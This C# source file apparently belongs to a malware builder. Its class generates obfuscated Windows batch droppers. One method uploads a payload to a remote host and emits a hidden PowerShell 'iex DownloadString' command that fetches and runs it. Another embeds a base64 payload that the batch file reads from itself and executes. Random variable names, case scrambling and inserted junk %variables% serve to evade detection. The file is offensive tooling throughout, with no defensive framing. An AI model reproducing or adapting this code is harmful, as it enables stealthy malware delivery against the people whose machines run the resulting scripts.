using System;
using System.Linq;
using System.Text;
using System.Windows.Forms;


public class Bat_Encoder
{
  private static string Command(string url)
  {
    string randomString1 = Functions.generate_random_string(new Random().Next(5, 30));
    string randomString2 = Functions.generate_random_string(new Random().Next(5, 30));
    string randomString3 = Functions.generate_random_string(new Random().Next(5, 30));
    string randomString4 = Functions.generate_random_string(new Random().Next(5, 30));
    Functions.generate_random_string(new Random().Next(5, 30));
    Functions.generate_random_string(new Random().Next(5, 30));
    Functions.generate_random_string(new Random().Next(5, 30));
    Functions.generate_random_string(new Random().Next(5, 30));
    return "$" + randomString1 + " = '" + randomString2 + "'; " + Functions.RandomizeCase("iex ([System.Net.WebClient]::new()).DownloadString") + "('" + url + "') ;$" + randomString3 + " = '" + randomString4 + "';";
  }

  private static string self_execute_command(int lenght)
  {
    string randomString1 = Functions.generate_random_string(new Random().Next(5, 30));
    string randomString2 = Functions.generate_random_string(new Random().Next(5, 30));
    string randomString3 = Functions.generate_random_string(new Random().Next(5, 30));
    string randomString4 = Functions.generate_random_string(new Random().Next(5, 30));
    string randomString5 = Functions.generate_random_string(new Random().Next(5, 30));
    string randomString6 = Functions.generate_random_string(new Random().Next(5, 30));
    string randomString7 = Functions.generate_random_string(new Random().Next(5, 30));
    string randomString8 = Functions.generate_random_string(new Random().Next(5, 30));
    string randomString9 = Functions.generate_random_string(new Random().Next(5, 30));
    return string.Format("${0} = '{1}';${2} = {3}; ${4} = {5}(${6}.{7} ${8} = ${9}[-{10}..-1]; ${11} = {12}(${13}); ${14} = {15}(${16}); {17}(${18}));${19} = '{20}';", (object) randomString1, (object) randomString2, (object) randomString9, (object) Functions.RandomizeCase("Get-Item '%~F0'"), (object) randomString8, (object) Functions.RandomizeCase("[System.IO.File]::ReadAllBytes"), (object) randomString9, (object) Functions.RandomizeCase("FullName);"), (object) randomString7, (object) randomString8, (object) lenght, (object) randomString6, (object) Functions.RandomizeCase("[System.Text.Encoding]::UTF8.GetString"), (object) randomString7, (object) randomString5, (object) Functions.RandomizeCase("[System.Convert]::FromBase64String"), (object) randomString6, (object) Functions.RandomizeCase("iex ([System.Text.Encoding]::UTF8.GetString"), (object) randomString5, (object) randomString3, (object) randomString4);
  }

  private static string EncodeCommand(string command)
  {
    return Convert.ToBase64String(Encoding.Unicode.GetBytes(command));
  }

  private static string Base64_Executer(string command)
  {
    string randomString1 = Functions.generate_random_string(new Random().Next(5, 30));
    string randomString2 = Functions.generate_random_string(new Random().Next(5, 30));
    string randomString3 = Functions.generate_random_string(new Random().Next(5, 30));
    Functions.generate_random_string(new Random().Next(5, 30));
    Functions.generate_random_string(new Random().Next(5, 30));
    Functions.generate_random_string(new Random().Next(5, 30));
    Functions.generate_random_string(new Random().Next(5, 30));
    Functions.generate_random_string(new Random().Next(5, 30));
    Functions.generate_random_string(new Random().Next(5, 30));
    return "$" + randomString1 + " = '" + command + "';;$" + randomString2 + " = " + Functions.RandomizeCase("[System.Convert]::FromBase64String") + "($" + randomString1 + ");$" + randomString3 + " = " + Functions.RandomizeCase("[System.Text.Encoding]::UTF8.GetString") + "($" + randomString2 + ");" + Functions.RandomizeCase("iex") + "($" + randomString3 + ")";
  }

  public static string bBuild_Bat(string payload)
  {
    if (payload != null)
    {
      string base64String = Convert.ToBase64String(Encoding.UTF8.GetBytes(payload));
      string str1 = Bat_Encoder.self_execute_command(base64String.Length);
      Bat_Encoder.EncodeCommand(str1);
      Console.WriteLine(str1);
      string str2 = Bat_Encoder.Base64_Executer(Convert.ToBase64String(Encoding.UTF8.GetBytes(str1)));
      return "\r\n@echo off\r\n" + Functions.RandomizeCase("powershell -w h ") + str2 + "\r\nexit" + "\r\n" + base64String;
    }
    int num = (int) MessageBox.Show("Build failed!!", "Error");
    return (string) null;
  }

  public static string Build_Bat(string payload)
  {
    string url = Internet_Stuff.Upload(payload);
    Console.WriteLine(url);
    if (string.IsNullOrEmpty(url))
      return (string) null;
    string str = Bat_Encoder.EncodeCommand(Bat_Encoder.Command(url));
    return Bat_Encoder.ObfuscateContent("\r\n@echo off\r\n" + Functions.RandomizeCase("powershell -w h -e") + " " + str + "\r\n");
  }

  private static string ObfuscateContent(string content)
  {
    StringBuilder stringBuilder = new StringBuilder();
    Random rand = new Random();
    bool flag = false;
    foreach (char ch in content)
    {
      if (!flag)
      {
        if (ch == '%')
        {
          stringBuilder.Append('%');
          flag = true;
        }
        else
        {
          string str = new string(Enumerable.Range(0, rand.Next(1, 11)).Select<int, char>((Func<int, char>) (_ => (char) rand.Next(97, 123))).ToArray<char>());
          stringBuilder.Append(string.Format("{0}%{1}%", (object) ch, (object) str));
        }
      }
      else if (ch == '%')
      {
        stringBuilder.Append('%');
        flag = false;
      }
      else
        stringBuilder.Append(ch);
    }
    return stringBuilder.ToString();
  }

  private static string Kock(string batchContent)
  {
    Random random = new Random();
    StringBuilder stringBuilder = new StringBuilder();
    string[] strArray = batchContent.Split(new string[3]
    {
      "\r\n",
      "\r",
      "\n"
    }, StringSplitOptions.None);
    stringBuilder.AppendLine("@echo off");
    bool flag = false;
    foreach (string str1 in strArray)
    {
      if (str1.Contains(":") || str1.Trim().StartsWith("set") || str1.Trim().StartsWith("call") || str1.Trim().StartsWith("echo"))
      {
        stringBuilder.AppendLine(str1);
      }
      else
      {
        foreach (char ch in str1)
        {
          if (!flag)
          {
            switch (ch)
            {
              case '\n':
                stringBuilder.AppendLine();
                continue;
              case '%':
                stringBuilder.Append('%');
                flag = true;
                continue;
              default:
                string str2 = new string(Enumerable.Repeat<string>("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ", random.Next(1, 11)).Select<string, char>((Func<string, char>) (s => s[random.Next(s.Length)])).ToArray<char>());
                stringBuilder.Append(string.Format("{0}%{1}%", (object) ch, (object) str2));
                continue;
            }
          }
          else
          {
            switch (ch)
            {
              case '\n':
                stringBuilder.AppendLine();
                break;
              case '%':
                stringBuilder.Append('%');
                flag = false;
                break;
              default:
                stringBuilder.Append(ch);
                break;
            }
          }
        }
        stringBuilder.AppendLine();
      }
    }
    return stringBuilder.ToString();
  }
}
